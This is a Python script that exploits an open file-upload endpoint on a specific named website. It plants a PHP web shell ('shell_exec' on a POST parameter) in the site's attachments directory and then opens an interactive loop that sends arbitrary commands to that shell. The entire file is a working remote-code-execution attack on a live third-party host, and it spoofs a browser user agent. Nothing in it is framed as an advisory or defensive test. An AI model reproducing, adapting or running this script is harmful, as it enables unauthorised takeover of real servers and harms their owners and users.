#!/usr/bin/python3
import json
import secrets
import sys
import requests
from pathlib import Path
from colorama import init, Fore, Style

init()

API_URL = "https://fs.sev.org.tr/index.php"
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
}


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


def info(msg):
    eprint(f"{Fore.WHITE}{Style.BRIGHT}info:{Style.RESET_ALL} {msg}")


def die(msg):
    eprint(f"{Fore.RED}{Style.BRIGHT}error:{Style.RESET_ALL} {msg}")
    sys.exit(1)


def upload_payload(payload):
    payload_name = "{}.php".format(secrets.token_urlsafe(8))
    info(f"uploading payload `{payload_name}`")
    files = {
        "attachment[]": (
            payload_name,
            payload,
            "text/plain",
        ),
        "file_id": (None, "0"),
        "id": (None, "attachment"),
        "randomize": (None, "1"),
        "uploadDir": (None, "files/attachments/"),
        "simsUploadPhrase": (None, ""),
    }
    resp = json.loads(
        requests.post(API_URL, headers=DEFAULT_HEADERS, files=files).content
    )

    if "error" in resp["message"]:
        die("failed to upload payload: {}".format(resp["message"]["error"]))

    payload_url = "https://fs.sev.org.tr/files/attachments/{}".format(resp["filename"])
    info(f"the payload is at `{payload_url}`")

    with open("payload_url", "w") as f:
        f.write(payload_url + "\n")

    return payload_url


def main():
    if Path("payload_url").exists():
        with open("payload_url") as f:
            payload_url = f.read().rstrip()
        info(f"payload already on the server at `{payload_url}`")
    else:
        payload_url = upload_payload('<?php echo shell_exec($_POST["cmd"]); ?>')
    info("entering shell")
    info("type `exit` to quit")
    while True:
        print("$ ", end="")
        cmd = input()
        if cmd == "exit":
            break
        resp = requests.post(payload_url, headers=DEFAULT_HEADERS, data={"cmd": cmd})
        print(resp.text)


if __name__ == "__main__":
    main()
